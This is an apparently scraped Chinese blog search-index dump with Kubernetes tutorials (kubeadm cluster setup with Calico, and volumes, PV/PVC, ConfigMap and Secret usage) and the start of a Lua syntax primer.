registry.aliyuncs.com/google_containers/coredns:v1.8.6\n在意一下pause镜像的的版本名称我这里是registry.aliyuncs.com/google_containers/pause:3.7修改containerd的配置文件&#x2F;etc&#x2F;containerd&#x2F;config.toml,把里面的sandbox_image的值改为pause镜像的全称加版本\n$ cat /etc/containerd/config.toml |grep sandboxsandbox_image = &quot;registry.aliyuncs.com/google_containers/pause:3.7&quot;\n重启Containerd:systemctl restart containerd初始化master节点:kubeadm init --config kubeadm.yaml**注意:**修改containerd的sandbox_image配置是全部的主机都要修改初始化成功之后会打印下面的内容\nYour Kubernetes control-plane has initialized successfully!To start using your cluster, you need to run the following as a regular user:  mkdir -p $HOME/.kube  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config  sudo chown $(id -u):$(id -g) $HOME/.kube/configAlternatively, if you are the root user, you can run:  export KUBECONFIG=/etc/kubernetes/admin.confYou should now deploy a pod network to the cluster.Run &quot;kubectl apply -f [podnetwork].yaml&quot; with one of the options listed at:  https://kubernetes.io/docs/concepts/cluster-administration/addons/Then you can join any number of worker nodes by running the following on each as root:kubeadm join 192.168.0.4:6443 --token abcdef.0123456789abcdef \\        --discovery-token-ca-cert-hash sha256:91b1d4502e8950ece37fbc591160007f5e2a3311ff0ebe05112d24851ca082a9\n其中下面内容需要自己去执行\no start using your cluster, you need to run the following as a regular user:  mkdir -p $HOME/.kube  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config  sudo chown $(id -u):$(id -g) $HOME/.kube/configAlternatively, if you are the root user, you can run:  export KUBECONFIG=/etc/kubernetes/admin.conf\n之后这段内容是加入集群的命令,work节点可以通过下面命令来加入集群\nThen you can join any number of worker nodes by running the following on each as root:kubeadm join 192.168.0.4:6443 --token abcdef.0123456789abcdef \\        --discovery-token-ca-cert-hash sha256:91b1d4502e8950ece37fbc591160007f5e2a3311ff0ebe05112d24851ca082a9\nWORK节点WORK节点执行master节点返回的加入集群命令加入集群,出现下面内容即加入成功\nkubeadm join 192.168.0.4:6443 --token abcdef.0123456789abcdef \\        --discovery-token-ca-cert-hash sha256:91b1d4502e8950ece37fbc591160007f5e2a3311ff0ebe05112d24851ca082a9This node has joined the cluster:* Certificate signing request was sent to apiserver and a response was received.* The Kubelet was informed of the new secure connection details.Run &#x27;kubectl get nodes&#x27; on the control-plane to see this node join the cluster.\n网络插件Calico选择网络插件可参考官方文档进行选择本文选用Calico网络插件在master节点下载calico的yaml文件curl https://projectcalico.docs.tigera.io/archive/v3.22/manifests/calico.yaml -O找到下面两行内容进行取消注释并修改value值\n# - name: CALICO_IPV4POOL_CIDR#   value: &quot;192.168.0.0/16&quot;\nvalue值应为开始创建master节点时的pod网络10.244.0.0/16,修改后为\n- name: CALICO_IPV4POOL_CIDR  value: &quot;10.244.0.0/16&quot;\n之后进行创建，创建方法如下\n$ sudu kubectl apply -f calico.yamlconfigmap/calico-config unchangedcustomresourcedefinition.apiextensions.k8s.io/bgpconfigurations.crd.projectcalico.org configuredcustomresourcedefinition.apiextensions.k8s.io/bgppeers.crd.projectcalico.org configuredcustomresourcedefinition.apiextensions.k8s.io/blockaffinities.crd.projectcalico.org configuredcustomresourcedefinition.apiextensions.k8s.io/caliconodestatuses.crd.projectcalico.org configuredcustomresourcedefinition.apiextensions.k8s.io/clusterinformations.crd.projectcalico.org configuredcustomresourcedefinition.apiextensions.k8s.io/felixconfigurations.crd.projectcalico.org configuredcustomresourcedefinition.apiextensions.k8s.io/globalnetworkpolicies.crd.projectcalico.org configuredcustomresourcedefinition.apiextensions.k8s.io/globalnetworksets.crd.projectcalico.org configuredcustomresourcedefinition.apiextensions.k8s.io/hostendpoints.crd.projectcalico.org configuredcustomresourcedefinition.apiextensions.k8s.io/ipamblocks.crd.projectcalico.org configuredcustomresourcedefinition.apiextensions.k8s.io/ipamconfigs.crd.projectcalico.org configuredcustomresourcedefinition.apiextensions.k8s.io/ipamhandles.crd.projectcalico.org configuredcustomresourcedefinition.apiextensions.k8s.io/ippools.crd.projectcalico.org configuredcustomresourcedefinition.apiextensions.k8s.io/ipreservations.crd.projectcalico.org configuredcustomresourcedefinition.apiextensions.k8s.io/kubecontrollersconfigurations.crd.projectcalico.org configuredcustomresourcedefinition.apiextensions.k8s.io/networkpolicies.crd.projectcalico.org configuredcustomresourcedefinition.apiextensions.k8s.io/networksets.crd.projectcalico.org configuredclusterrole.rbac.authorization.k8s.io/calico-kube-controllers unchangedclusterrolebinding.rbac.authorization.k8s.io/calico-kube-controllers unchangedclusterrole.rbac.authorization.k8s.io/calico-node unchangedclusterrolebinding.rbac.authorization.k8s.io/calico-node unchangeddaemonset.apps/calico-node createdserviceaccount/calico-node createddeployment.apps/calico-kube-controllers createdserviceaccount/calico-kube-controllers createdWarning: policy/v1beta1 PodDisruptionBudget is deprecated in v1.21+, unavailable in v1.25+; use policy/v1 PodDisruptionBudgetpoddisruptionbudget.policy/calico-kube-controllers created\n执行完成没有报错之后可以运行kubectl get node来查看节点的联通状态,当STATUS全都变成Ready即部署成功\n$ kubectl get nodeNAME             STATUS   ROLES           AGE   VERSIONmaster.host.com  Ready    control-plane   43m   v1.24.3work1.host.com   Ready    &lt;none&gt;          39m   v1.24.3work2.host.com   Ready    &lt;none&gt;          39m   v1.24.3\n问题\n出现报错以及问题欢迎在评论区讨论\n\n","categories":["容器编排"],"tags":["开源工具","Kubernetes","Kubeadm","Containerd"]},{"title":"Kubernetes-数据存储","url":"/2022/09/07/Kubernetes-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/","content":"数据存储概述容器的生命周期可能很短，会被频繁地创建和销毁。那么容器在销毁时，保存在容器中的数据也会被清除。这种结果对用户来说，在某些情况下是不乐意看到的。为了持久化保存容器的数据，kubernetes引入了Volume的概念。Volume是Pod中能够被多个容器访问的共享目录，它被定义在Pod上，然后被一个Pod里的多个容器挂载到具体的文件目录下，kubernetes通过Volume实现同一个Pod中不同容器之间的数据共享以及数据的持久化存储。Volume的生命容器不与Pod中单个容器的生命周期相关，当容器终止或者重启时，Volume中的数据也不会丢失。\n数据存储类型\n简单存储：EmptyDir、HostPath、NFS\n高级存储：PV、PVC\n配置存储：ConfigMap、Secret\n\n简单存储EmptyDir EmptyDir是最基础的Volume类型，一个EmptyDir就是Host上的一个空目录。\n​    EmptyDir是在Pod被分配到Node时创建的，它的初始内容为空，并且无须指定宿主机上对应的目录文件，因为kubernetes会自动分配一个目录，当Pod销毁时， EmptyDir中的数据也会被永久删除。 EmptyDir用途如下：\n\n临时空间，例如用于某些应用程序运行时所需的临时目录，且无须永久保留\n\n一个容器需要从另一个容器中获取数据的目录（多容器共享目录）\n\n\n在一个Pod中准备两个容器nginx和busybox，然后声明一个Volume分别挂在到两个容器的目录中，然后nginx容器负责向Volume中写日志，busybox中通过命令将日志内容读到控制台。\n创建Volume-Emptydir.yaml,内容如下\napiVersion: v1kind: Podmetadata:  name: volume-emptydir  namespace: defaultspec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1    ports:    - containerPort: 80    volumeMounts:  # 将logs-volume挂在到nginx容器中，对应的目录为 /var/log/nginx    - name: logs-volume      mountPath: /var/log/nginx  - name: busybox    image: docker.io/library/busybox:1.35.0    command: [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;tail -f /logs/access.log&quot;] # 初始命令，动态读取指定文件中内容    volumeMounts:  # 将logs-volume 挂在到busybox容器中，对应的目录为 /logs    - name: logs-volume      mountPath: /logs  volumes: # 声明volume， name为logs-volume，类型为emptyDir  - name: logs-volume    emptyDir: &#123;&#125;\n\n# 创建Pod[root@master yaml]# kubectl create -f Volume-Emptydir.yamlpod/volume-emptydir created# 查看Pod[root@master yaml]# kubectl get pod -n default -o wideNAME                                  READY   STATUS             RESTARTS          AGE     IP              NODE             NOMINATED NODE   READINESS GATESvolume-emptydir                       2/2     Running            0                 76s     10.244.67.121   work1.host.com   &lt;none&gt;           &lt;none&gt;# 访问nginx[root@master yaml]# curl 10.244.67.121......&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;......# 查看busybox日志[root@master yaml]# kubectl logs -f volume-emptydir -n default -c busybox10.244.34.192 - - [06/Sep/2022:12:50:33 +0000] &quot;GET / HTTP/1.1&quot; 200 615 &quot;-&quot; &quot;curl/7.61.1&quot; &quot;-&quot;\n\n\n\nHostPathEmptyDir中数据不会被持久化，它会随着Pod的结束而销毁，如果想简单的将数据持久化到主机中，可以选择HostPath。HostPath就是将Node主机中一个实际目录挂在到Pod中，以供容器使用，这样的设计就可以保证Pod销毁了，但是数据依据可以存在于Node主机上。\n创建Volume-Hostpath.yaml,内容如下\napiVersion: v1kind: Podmetadata:  name: volume-hostpath  namespace: defaultspec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1    ports:    - containerPort: 80    volumeMounts:    - name: logs-volume      mountPath: /var/log/nginx  - name: busybox    image: docker.io/library/busybox:1.35.0    command: [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;tail -f /logs/access.log&quot;]    volumeMounts:    - name: logs-volume      mountPath: /logs  volumes:  - name: logs-volume    hostPath:       path: /root/logs      type: DirectoryOrCreate  # 目录存在就使用，不存在就先创建后使用\n\n关于type的值的一点说明：\tDirectoryOrCreate 目录存在就使用，不存在就先创建后使用\tDirectory\t目录必须存在\tFileOrCreate  文件存在就使用，不存在就先创建后使用\tFile 文件必须存在\t    Socket\tunix套接字必须存在\tCharDevice\t字符设备必须存在\tBlockDevice 块设备必须存在\n\n# 创建Pod[root@master yaml]# kubectl create -f Volume-Hostpath.yamlpod/volume-hostpath created# 查看Pod# 发现部署在work1下面[root@master yaml]# kubectl get pods volume-hostpath -n default -o wideNAME              READY   STATUS    RESTARTS   AGE   IP             NODE             NOMINATED NODE   READINESS GATESvolume-hostpath   2/2     Running   0          17s   10.244.67.94   work1.host.com   &lt;none&gt;           &lt;none&gt;# 访问nginx[root@master yaml]# curl 10.244.67.94......&lt;h1&gt;Welcome to nginx!&lt;/h1&gt;......# 查看文件# 在work1主机里查看/root/logs/目录[root@work1 ~]# ls /root/logs/access.log  error.log[root@work1 ~]# cat /root/logs/access.log10.244.34.192 - - [06/Sep/2022:12:57:39 +0000] &quot;GET / HTTP/1.1&quot; 200 615 &quot;-&quot; &quot;curl/7.61.1&quot; &quot;-&quot;\n\nNFSHostPath可以解决数据持久化的问题，但是一旦Node节点故障了，Pod如果转移到了别的节点，又会出现问题了，此时需要准备单独的网络存储系统，比较常用的用NFS、CIFS。NFS是一个网络文件存储系统，可以搭建一台NFS服务器，然后将Pod中的存储直接连接到NFS系统上，这样的话，无论Pod在节点上怎么转移，只要Node跟NFS的对接没问题，数据就可以成功访问。\n# 在master主机安装nfs服务[root@master ~]# yum -y install rpcbind nfs-utils# 创建共享目录[root@master ~]# mkdir /root/data/nfs -pvmkdir: created directory &#x27;/root/data&#x27;mkdir: created directory &#x27;/root/data/nfs&#x27;# 编写配置文件[root@master ~]# vim /etc/exports[root@master ~]# more /etc/exports/root/data/nfs     192.16.1.0/24(rw,no_root_squash)# 启动nfs服务[root@master ~]# systemctl enable --now rpcbind&amp;&amp;systemctl enable --now nfs-serverCreated symlink /etc/systemd/system/multi-user.target.wants/rpcbind.service → /usr/lib/systemd/system/rpcbind.service.Created symlink /etc/systemd/system/multi-user.target.wants/nfs-server.service → /usr/lib/systemd/system/nfs-server.service.# 更新配置[root@master ~]# exportfs -r# 在work节点安装nfs-utils[root@work1 ~]# yum -y install nfs-utils[root@work2 ~]# yum -y install nfs-utils# 在work节点验证nfs[root@work1 ~]# showmount -e master.host.comExport list for master.host.com:/root/data/nfs 192.16.1.0/24[root@work2 ~]# showmount -e master.host.comExport list for master.host.com:/root/data/nfs 192.16.1.0/24\n\n创建Volume-Nfs.yaml，内容如下\napiVersion: v1kind: Podmetadata:  name: volume-nfs  namespace: defaultspec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1    ports:    - containerPort: 80    volumeMounts:    - name: logs-volume      mountPath: /var/log/nginx  - name: busybox    image: docker.io/library/busybox:1.35.0    command: [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;tail -f /logs/access.log&quot;]     volumeMounts:    - name: logs-volume      mountPath: /logs  volumes:  - name: logs-volume    nfs:      server: 192.16.1.10  #nfs服务器地址      path: /root/data/nfs #共享文件路径\n\n# 创建Pod[root@master yaml]# kubectl create -f Volume-Nfs.yamlpod/volume-nfs created# 查看Pod[root@master yaml]# kubectl get pods volume-nfs -n defaultNAME         READY   STATUS    RESTARTS   AGEvolume-nfs   2/2     Running   0          9s# 查看master节点nfs的目录# 发现已经有数据了[root@master yaml]# ls /root/data/nfs/access.log  error.log\n\n\n\n高级存储前面已经介绍了NFS提供存储，此时就要求用户会搭建NFS系统，并且会在yaml配置nfs。由于kubernetes支持的存储系统有很多，要求客户全都掌握，显然不现实。为了能够屏蔽底层存储实现的细节，方便用户使用， kubernetes引入PV和PVC两种资源对象。PV（Persistent Volume）是持久化卷的意思，是对底层的共享存储的一种抽象。一般情况下PV由kubernetes管理员进行创建和配置，它与底层具体的共享存储技术有关，并通过插件完成与共享存储的对接。\nPVC（Persistent Volume Claim）是持久卷声明的意思，是用户对于存储需求的一种声明。换句话说，PVC其实就是用户向kubernetes系统发出的一种资源需求申请。\n\n使用了PV和PVC之后，工作可以得到进一步的细分：\n\n存储：存储工程师维护\nPV：kubernetes管理员维护\nPVC：kubernetes用户维护\n\nPVPV（Persistent Volume）是持久化卷的意思，是对底层的共享存储的一种抽象。一般情况下PV由kubernetes管理员进行创建和配置，它与底层具体的共享存储技术有关，并通过插件完成与共享存储的对接。\nPV是存储资源的抽象，下面是是资源清单格式\napiVersion: v1  kind: PersistentVolumemetadata:  name: pv2spec:  nfs: # 存储类型，与底层真正存储对应  capacity:  # 存储能力，目前只支持存储空间的设置    storage: 2Gi  accessModes:  # 访问模式  storageClassName: # 存储类别  persistentVolumeReclaimPolicy: # 回收策略\n\n\n存储类型\n底层实际存储的类型，kubernetes支持多种存储类型，每种存储类型的配置都有所差异\n\n存储能力（capacity）\n\n\n​      目前只支持存储空间的设置( storage&#x3D;1Gi )，不过未来可能会加入IOPS、吞吐量等指标的配置\n\n访问模式（accessModes）\n用于描述用户应用对存储资源的访问权限，访问权限包括下面几种方式：\n\nReadWriteOnce（RWO）：读写权限，但是只能被单个节点挂载\nReadOnlyMany（ROX）：  只读权限，可以被多个节点挂载\nReadWriteMany（RWX）：读写权限，可以被多个节点挂载\n\n需要注意的是，底层不同的存储类型可能支持的访问模式不同\n\n回收策略（persistentVolumeReclaimPolicy）\n当PV不再被使用了之后，对其的处理方式。目前支持三种策略：\n\nRetain  （保留）  保留数据，需要管理员手工清理数据\nRecycle（回收）  清除 PV 中的数据，效果相当于执行 rm -rf &#x2F;thevolume&#x2F;*\nDelete  （删除） 与 PV 相连的后端存储完成 volume 的删除操作，当然这常见于云服务商的存储服务\n\n需要注意的是，底层不同的存储类型可能支持的回收策略不同\n\n存储类别\nPV可以通过storageClassName参数指定一个存储类别\n\n具有特定类别的PV只能与请求了该类别的PVC进行绑定\n\n未设定类别的PV则只能与不请求任何类别的PVC进行绑定\n\n\n\n状态（status）\n一个 PV 的生命周期中，可能会处于4中不同的阶段：\n\nAvailable（可用）：     表示可用状态，还未被任何 PVC 绑定\nBound（已绑定）：     表示 PV 已经被 PVC 绑定\nReleased（已释放）： 表示 PVC 被删除，但是资源还未被集群重新声明\nFailed（失败）：         表示该 PV 的自动回收失败\n\n使用NFS作为存储，来创建PV，NFS配置如下\n# master节点创建nfs存储[root@master ~]# cat /etc/exports/root/data/pv1     192.16.1.0/24(rw,no_root_squash)/root/data/pv2     192.16.1.0/24(rw,no_root_squash)/root/data/pv3     192.16.1.0/24(rw,no_root_squash)[root@master ~]# exportfs -r# work节点查看[root@work1 ~]# showmount -e 192.16.1.10Export list for 192.16.1.10:/root/data/pv3 192.16.1.0/24/root/data/pv2 192.16.1.0/24/root/data/pv1 192.16.1.0/24\n\n创建Pv-Env.yaml,内容如下\napiVersion: v1kind: PersistentVolumemetadata:  name:  pv1spec:  capacity:     storage: 1Gi  accessModes:  - ReadWriteMany  persistentVolumeReclaimPolicy: Retain  nfs:    path: /root/data/pv1    server: 192.16.1.10---apiVersion: v1kind: PersistentVolumemetadata:  name:  pv2spec:  capacity:     storage: 2Gi  accessModes:  - ReadWriteMany  persistentVolumeReclaimPolicy: Retain  nfs:    path: /root/data/pv2    server: 192.16.1.10    ---apiVersion: v1kind: PersistentVolumemetadata:  name:  pv3spec:  capacity:     storage: 3Gi  accessModes:  - ReadWriteMany  persistentVolumeReclaimPolicy: Retain  nfs:    path: /root/data/pv3    server: 192.16.1.10\n\n# 创建Pv[root@master yaml]# kubectl create -f Pv-Env.yamlpersistentvolume/pv1 createdpersistentvolume/pv2 createdpersistentvolume/pv3 created# 查看Pv[root@master yaml]# kubectl get pvNAME   CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS      CLAIM   STORAGECLASS   REASON   AGEpv1    1Gi        RWX            Retain           Available                                   23spv2    2Gi        RWX            Retain           Available                                   23spv3    3Gi        RWX            Retain           Available                                   23s\n\nPVCPVC（Persistent Volume Claim）是持久卷声明的意思，是用户对于存储需求的一种声明。换句话说，PVC其实就是用户向kubernetes系统发出的一种资源需求申请。\nPVC是资源的申请，用来声明对存储空间、访问模式、存储类别需求信息。下面是是资源清单格式\napiVersion: v1kind: PersistentVolumeClaimmetadata:  name: pvc  namespace: devspec:  accessModes: # 访问模式  selector: # 采用标签对PV选择  storageClassName: # 存储类别  resources: # 请求空间    requests:      storage: 5Gi\n\n\n访问模式（accessModes）\n\n​       用于描述用户应用对存储资源的访问权限\n\n选择条件（selector）\n通过Label Selector的设置，可使PVC对于系统中己存在的PV进行筛选\n\n存储类别（storageClassName）\nPVC在定义时可以设定需要的后端存储的类别，只有设置了该class的pv才能被系统选出\n\n资源请求（Resources ）\n描述对存储资源的请求\n\n\n创建Pvc-Basic.yaml,内容如下\napiVersion: v1kind: PersistentVolumeClaimmetadata:  name: pvc1  namespace: defaultspec:  accessModes:  - ReadWriteMany  resources:    requests:      storage: 1Gi---apiVersion: v1kind: PersistentVolumeClaimmetadata:  name: pvc2  namespace: defaultspec:  accessModes:  - ReadWriteMany  resources:    requests:      storage: 1Gi---apiVersion: v1kind: PersistentVolumeClaimmetadata:  name: pvc3  namespace: defaultspec:  accessModes:  - ReadWriteMany  resources:    requests:      storage: 1Gi\n\n# 创建Pvc[root@master yaml]# kubectl create -f Pvc-Basic.yamlpersistentvolumeclaim/pvc1 createdpersistentvolumeclaim/pvc2 createdpersistentvolumeclaim/pvc3 created# 查看Pvc[root@master yaml]# kubectl get pvc  -n default -o wideNAME   STATUS   VOLUME   CAPACITY   ACCESS MODES   STORAGECLASS   AGE   VOLUMEMODEpvc1   Bound    pv1      1Gi        RWX                           34s   Filesystempvc2   Bound    pv2      2Gi        RWX                           34s   Filesystempvc3   Bound    pv3      3Gi        RWX                           34s   Filesystem# 查看Pv状态[root@master yaml]#  kubectl get pv -o wideNAME   CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM          STORAGECLASS   REASON   AGE   VOLUMEMODEpv1    1Gi        RWX            Retain           Bound    default/pvc1                           15m   Filesystempv2    2Gi        RWX            Retain           Bound    default/pvc2                           15m   Filesystempv3    3Gi        RWX            Retain           Bound    default/pvc3                           15m   Filesystem\n\n\n\nPod使用Pvc作为存储，创建Pvc-Pod.yaml,内容如下\napiVersion: v1kind: Podmetadata:  name: pvc-pod1  namespace: defaultspec:  containers:  - name: busybox    image: docker.io/library/busybox:1.35.0    command: [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;while true;do echo pod1 &gt;&gt; /root/out.txt; sleep 10; done;&quot;]    volumeMounts:    - name: volume      mountPath: /root/  volumes:    - name: volume      persistentVolumeClaim:        claimName: pvc1        readOnly: false---apiVersion: v1kind: Podmetadata:  name: pvc-pod2  namespace: defaultspec:  containers:  - name: busybox    image: docker.io/library/busybox:1.35.0    command: [&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;while true;do echo pod2 &gt;&gt; /root/out.txt; sleep 10; done;&quot;]    volumeMounts:    - name: volume      mountPath: /root/  volumes:    - name: volume      persistentVolumeClaim:        claimName: pvc2        readOnly: false   \n\n# 创建Pod[root@master yaml]# kubectl create -f Pvc-Pod.yamlpod/pvc-pod1 createdpod/pvc-pod2 created# 查看Pod[root@master yaml]# kubectl get pods -n default -o wideNAME                                  READY   STATUS             RESTARTS          AGE     IP              NODE             NOMINATED NODE   READINESS GATESpvc-pod1                              1/1     Running            0                 27s     10.244.67.75    work1.host.com   &lt;none&gt;           &lt;none&gt;pvc-pod2                              1/1     Running            0                 27s     10.244.67.90    work1.host.com   &lt;none&gt;           &lt;none&gt;# 查看Pvc[root@master yaml]# kubectl get pv -n dev -o wideNAME   CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM          STORAGECLASS   REASON   AGE   VOLUMEMODEpv1    1Gi        RWX            Retain           Bound    default/pvc1                           21m   Filesystempv2    2Gi        RWX            Retain           Bound    default/pvc2                           21m   Filesystempv3    3Gi        RWX            Retain           Bound    default/pvc3                           21m   Filesystem# 查看nfs中的存储文件[root@master yaml]# cat /root/data/pv1/out.txtpod1pod1pod1[root@master yaml]# cat /root/data/pv2/out.txtpod2pod2pod2\n\n生命周期PVC和PV是一一对应的，PV和PVC之间的相互作用遵循以下生命周期：\n\n资源供应：管理员手动创建底层存储和PV\n\n资源绑定：用户创建PVC，kubernetes负责根据PVC的声明去寻找PV，并绑定\n在用户定义好PVC之后，系统将根据PVC对存储资源的请求在已存在的PV中选择一个满足条件的\n\n一旦找到，就将该PV与用户定义的PVC进行绑定，用户的应用就可以使用这个PVC了\n\n如果找不到，PVC则会无限期处于Pending状态，直到等到系统管理员创建了一个符合其要求的PV\n\n\nPV一旦绑定到某个PVC上，就会被这个PVC独占，不能再与其他PVC进行绑定了\n\n资源使用：用户可在pod中像volume一样使用pvc\nPod使用Volume的定义，将PVC挂载到容器内的某个路径进行使用。\n\n资源释放：用户删除pvc来释放pv\n当存储资源使用完毕后，用户可以删除PVC，与该PVC绑定的PV将会被标记为“已释放”，但还不能立刻与其他PVC进行绑定。通过之前PVC写入的数据可能还被留在存储设备上，只有在清除之后该PV才能再次使用。\n\n资源回收：kubernetes根据pv设置的回收策略进行资源的回收\n对于PV，管理员可以设定回收策略，用于设置与之绑定的PVC释放资源之后如何处理遗留数据的问题。只有PV的存储空间完成回收，才能供新的PVC绑定和使用\n\n\n\n配置存储ConfigMapConfigMap是一种比较特殊的存储卷，它的主要作用是用来存储配置信息的。\n创建Cm-Basic.yaml，内容如下：\napiVersion: v1kind: ConfigMapmetadata:  name: configmap  namespace: defaultdata:  info: |    username:admin    password:123456\n\n# 创建Cm[root@master yaml]# kubectl create -f Cm-Basic.yamlconfigmap/configmap created# 查看Cm[root@master yaml]# kubectl describe cm configmap  -n defaultName:         configmapNamespace:    defaultLabels:       &lt;none&gt;Annotations:  &lt;none&gt;Data====info:----username:adminpassword:123456BinaryData====Events:  &lt;none&gt;\n\n创建Cm-Pod.yaml来使用Cm，内容如下\napiVersion: v1kind: Podmetadata:  name: cm-pod  namespace: defaultspec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1    volumeMounts: # 将configmap挂载到目录    - name: config      mountPath: /configmap/config  volumes: # 引用configmap  - name: config    configMap:      name: configmap\n\n# 创建Pod[root@master yaml]# kubectl create -f Cm-Pod.yamlpod/cm-pod created# 查看Pod[root@master yaml]# kubectl get pod cm-pod -n defaultNAME     READY   STATUS    RESTARTS   AGEcm-pod   1/1     Running   0          13s# 进入容器查看数据[root@master yaml]# kubectl exec -it cm-pod -n default /bin/shkubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.# ls /configmap/config/info# cat /configmap/config/infousername:adminpassword:123456# 可以看到映射已经成功，每个configmap都映射成了一个目录# key---&gt;文件     value----&gt;文件中的内容# 此时如果更新configmap的内容, 容器中的值也会动态更新\n\nSecret在kubernetes中，还存在一种和ConfigMap非常类似的对象，称为Secret对象。它主要用于存储敏感信息，例如密码、秘钥、证书等等。\n# 首先使用base64对数据进行编码[root@master yaml]# echo -n &#x27;admin&#x27; | base64YWRtaW4=[root@master yaml]# echo -n &#x27;123456&#x27; | base64MTIzNDU2\n\n创建Secret-Basic.yaml,内容如下\napiVersion: v1kind: Secretmetadata:  name: secret  namespace: defaulttype: Opaquedata:  username: YWRtaW4=  password: MTIzNDU2\n\n# 创建Secret[root@master yaml]# kubectl create -f Secret-Basic.yamlsecret/secret created# 查看Secret详情# 发现配置只显示大小[root@master yaml]# kubectl describe secret -n defaultName:         secretNamespace:    defaultLabels:       &lt;none&gt;Annotations:  &lt;none&gt;Type:  OpaqueData====password:  6 bytesusername:  5 bytes\n\n创建Secret-Pod.yaml,内容如下\napiVersion: v1kind: Podmetadata:  name: secret-pod  namespace: defaultspec:  containers:  - name: nginx    image: docker.io/library/nginx:1.23.1    volumeMounts: # 将secret挂载到目录    - name: config      mountPath: /secret/config  volumes:  - name: config    secret:      secretName: secret\n\n# 创建Pod[root@master yaml]# kubectl create -f Secret-Pod.yamlpod/secret-pod created# 查看Pod[root@master yaml]# kubectl get pod secret-pod -n defaultNAME         READY   STATUS    RESTARTS   AGEsecret-pod   1/1     Running   0          68s# 进入容器查看secret信息# 发现会自动解码[root@master yaml]# kubectl exec -it secret-pod /bin/sh -n defaultkubectl exec [POD] [COMMAND] is DEPRECATED and will be removed in a future version. Use kubectl exec [POD] -- [COMMAND] instead.# ls /secret/configpassword  username# cat /secret/config/usernameadmin# cat /secret/config/password123456\n\n\n","categories":["容器编排"],"tags":["开源工具","Kubernetes","数据存储"]},{"title":"Lua基础语法学习","url":"/2024/04/17/Lua%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/","content":"Lua概念Lua是一种轻量、小巧的脚本语言，用标准的C语言编写并以源代码形式开发。设计目的是为了嵌入其他的程序中，从而为应用程序提供灵活的扩展和定制功能。\n特性和他语言相比，Lua有其自身的特点：（1）轻量级\nlua用标准C语言编写并以源代码形式开发，编译后仅仅一百余千字节，可以很方便的嵌入道其他程序中。\n（2）可扩展\nlua提供非常丰富易于使用的扩展接口和机制，由宿主语言(通常是C或C++)提供功能，lua可以使用它们，就像内置的功能一样。\n（3）支持面向过程编程和函数式编程\n应用场景游戏开发、独立应用脚本、web应用脚本、扩展和数据库插件、系统安全上。\n安装官网: https://www.lua.org/\n[root@work env]# wget https://www.lua.org/ftp/lua-5.4.6.tar.gz[root@work env]# tar xvf lua-5.4.6.tar.gz [root@work lua-5.4.6]# make linux test[root@work lua-5.4.6]# make installcd src &amp;&amp; mkdir -p /usr/local/bin /usr/local/include /usr/local/lib /usr/local/man/man1 /usr/local/share/lua/5.4 /usr/local/lib/lua/5.4cd src &amp;&amp; install -p -m 0755 lua luac /usr/local/bincd src &amp;&amp; install -p -m 0644 lua.h luaconf.h lualib.h lauxlib.h lua.hpp /usr/local/includecd src &amp;&amp; install -p -m 0644 liblua.a /usr/local/libcd doc &amp;&amp; install -p -m 0644 lua.1 luac.1 /usr/local/man/man1[root@work lua-5.4.6]# lua -vLua 5.4.6  Copyright (C) 1994-2023 Lua.org, PUC-Rio\n语法他的语法和C&#x2F;C++语法非常相似，整体上比较清晰，简洁。条件语句、循环语句、函数调用都与C&#x2F;C++基本一致。\n交互式HelloWorld[root@work env]# luaLua 5.4.6  Copyright (C) 1994-2023 Lua.org, PUC-Rio&gt; print(&#x27;hello world!!&#x27;) hello world!!&gt; \n脚本式HelloWorld第一种方式[root@work ~]# mkdir lua_demo[root@work ~]# cd lua_demo/[root@work lua_demo]# vim hello.lua[root@work lua_demo]# cat hello.lua print(&#x27;hello world!!!&#x27;)[root@work lua_demo]# lua hello.lua hello world!!!\n第二种方式[root@work lua_demo]# vim hello.lua[root@work lua_demo]# cat hello.lua #! /usr/local/bin/luaprint(&#x27;hello world!!!&#x27;)[root@work lua_demo]# chmod +x hello.lua [root@work lua_demo]# ./hello.lua hello world!!!\n注释%% 单行注释 %%-- print(&quot;111&quot;)%% 多行注释 %%--[[\tprint(&quot;222&quot;)--]]%% 取消多行注释 %%---[[\tprint(&quot;222&quot;)--]]\n测试\n[root@work lua_demo]# vim demo2.lua[root@work lua_demo]# cat demo2.lua -- print(&quot;111&quot;)--[[\tprint(&quot;222&quot;)--]]---[[\tprint(&quot;333&quot;)--]][root@work lua_demo]# lua demo2.lua 333\n标识符标识符就是变量名，Lua定义变量名以 一个字母A到Z或a到z或下划线_开头后加上0个或者多个字母，下划线，数字(0-9)。这块建议最好不要使用下划线加大写字母的标识符，因为Lua的保留字也是这样定义的，容易发生冲突。注意Lua是区分大小写字母的。\n关键字下面Lua的关键词，大家在定义常量、变量或其他用户定义标识符都要避免使用一下关键字\n\n\n\nand\nbreak\ndo\nelse\n\n\n\nelseif\nend\nfalse\nfor\n\n\nfunction\nif\nin\nlocal\n\n\nnil\nnot\nor\nrepeat\n\n\nreturn\nthen\ntrue\nuntil\n\n\nwhile\ngoto\n\n\n\n\n一般约定，一以下划线开头连接一串大写字母的名字(比如_VERSION)被保留用于Lua内部全局变量。这个也是上面我们不建议这么定义标识符的原因\n\n\n\n\n\n运算符Lua中支持的运算符有算数运算符、关系运算符、逻辑运算符、其他运算符。\n算数运算符+ 加- 减* 乘/ 除% 取余^ 乘幂- 负号\n\n关系运算符== 等于~= 不等于&gt; 大于&lt; 小于&gt;= 大于等于&lt;= 小于等于\n逻辑运算符and 与 同时true返回true or 或 一个true返回truenot 非 取反\n其他运算符.. 连接两个字符串#  